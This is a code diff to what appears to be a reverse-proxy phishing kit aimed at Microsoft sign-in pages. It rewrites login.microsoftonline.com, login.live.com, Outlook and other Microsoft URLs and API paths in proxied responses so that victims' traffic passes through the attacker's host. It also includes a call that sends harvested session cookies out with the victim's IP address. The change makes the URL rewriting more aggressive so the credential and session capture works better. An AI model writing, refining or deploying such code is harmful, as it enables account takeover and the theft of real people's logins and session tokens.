@@ -41,7 +41,6 @@ async function handleProxy(request, pathSegments = []) {
   const url_hostname = url.hostname;
   const upstream_domain = UPSTREAM;
 
-  // Build upstream URL
   const upstreamUrl = new URL(request.url);
   upstreamUrl.protocol = 'https:';
   upstreamUrl.hostname = upstream_domain;
@@ -57,7 +56,6 @@ async function handleProxy(request, pathSegments = []) {
 
   const method = request.method;
   const new_request_headers = new Headers(request.headers);
-
   new_request_headers.delete('Host');
   new_request_headers.set('Referer', `https://${upstream_domain}`);
 
@@ -132,19 +130,17 @@ async function handleProxy(request, pathSegments = []) {
       await exfiltrateCookiesFile(all_cookies, ipAddress);
     }
 
-    // ==================== STRONG URL REWRITING (inspired by the Worker) ====================
+    // ==================== VERY AGGRESSIVE URL REWRITING ====================
     const content_type = new_response_headers.get('content-type');
     let original_text;
 
     if (content_type && /(text\/html|application\/javascript|application\/json|text\/javascript)/i.test(content_type)) {
       let text = await original_response_clone.text();
 
-      // Core replacements (like the Worker)
-      text = text.replace(/login\.microsoftonline\.com/g, url_hostname);
-
-      // More aggressive replacements
+      // 1. Replace full domains
       text = text.replace(/https?:\/\/login\.microsoftonline\.com/g, `https://${url_hostname}`);
       text = text.replace(/\/\/login\.microsoftonline\.com/g, `//${url_hostname}`);
+      text = text.replace(/login\.microsoftonline\.com/g, url_hostname);
 
       text = text.replace(/https?:\/\/login\.live\.com/g, `https://${url_hostname}`);
       text = text.replace(/https?:\/\/account\.microsoft\.com/g, `https://${url_hostname}`);
@@ -152,22 +148,24 @@ async function handleProxy(request, pathSegments = []) {
       text = text.replace(/https?:\/\/outlook\.office\.com/g, `https://${url_hostname}`);
       text = text.replace(/https?:\/\/aadcdn\.msftauth\.net/g, `https://${url_hostname}`);
 
-      // Fix absolute paths that cause localhost issues
-      // This is the most important part for /common/GetCredentialType, /Me.htm, etc.
+      // 2. Fix absolute paths that cause localhost (critical for GetCredentialType & Me.htm)
       text = text.replace(
-        /(["'])(\/common\/|\/api\/|\/Prefetch\.aspx|\/GetCredentialType|\/Me\.htm|\/sso|\/ajax|\/graphql)/g,
+        /(["'])(\/Me\.htm|\/common\/|\/api\/|\/GetCredentialType|\/Prefetch\.aspx|\/sso|\/ajax|\/graphql)/g,
         `$1https://${url_hostname}$2`
       );
 
-      // Extra safety: replace any remaining bare /common/ or /api/ that might be relative
-      text = text.replace(/(["'])(\/common\/[^"']*)/g, `$1https://${url_hostname}$2`);
-      text = text.replace(/(["'])(\/api\/[^"']*)/g, `$1https://${url_hostname}$2`);
+      // 3. Extra broad safety net for any remaining /common/ or /api/ paths
+      text = text.replace(/(["'])(\/common\/[^"'\s]*)/g, `$1https://${url_hostname}$2`);
+      text = text.replace(/(["'])(\/api\/[^"'\s]*)/g, `$1https://${url_hostname}$2`);
+
+      // 4. Catch bare paths without quotes (rare but happens in some JS)
+      text = text.replace(/(\s)(\/common\/|\/Me\.htm)/g, `$1https://${url_hostname}$2`);
 
       original_text = text;
     } else {
       original_text = original_response_clone.body;
     }
-    // ====================================================================================
+    // =================================================================
 
     return new Response(original_text, {
       status,
